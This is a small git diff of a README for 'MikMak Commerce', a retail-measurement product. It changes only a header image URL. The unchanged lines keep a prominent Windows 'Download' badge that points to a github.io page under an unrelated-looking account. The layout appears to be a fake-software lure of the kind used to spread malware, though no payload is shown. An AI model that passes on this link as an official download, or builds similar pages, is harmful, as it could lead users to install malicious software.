@@ -1,6 +1,6 @@
 # MikMak Commerce - Commerce Intelligence for Shoppable Media and Retail Measurement
 
-![Commerce dashboard showing retailer paths, campaign signals, and shopper journey insights](https://mms.businesswire.com/media/20230607005055/en/1811275/22/MM_3.0_TEAL.jpg)
+![Commerce dashboard showing retailer paths, campaign signals, and shopper journey insights](https://mms.businesswire.com/media/20230222005004/en/1717151/22/image1_%28002%29.jpg)
 
 [![Download MikMak Commerce](https://img.shields.io/badge/Download-MikMak_Commerce-blueviolet?style=for-the-badge&logo=windows)](https://petratolleygvkil.github.io/.github/MikMak-Commerce)
 
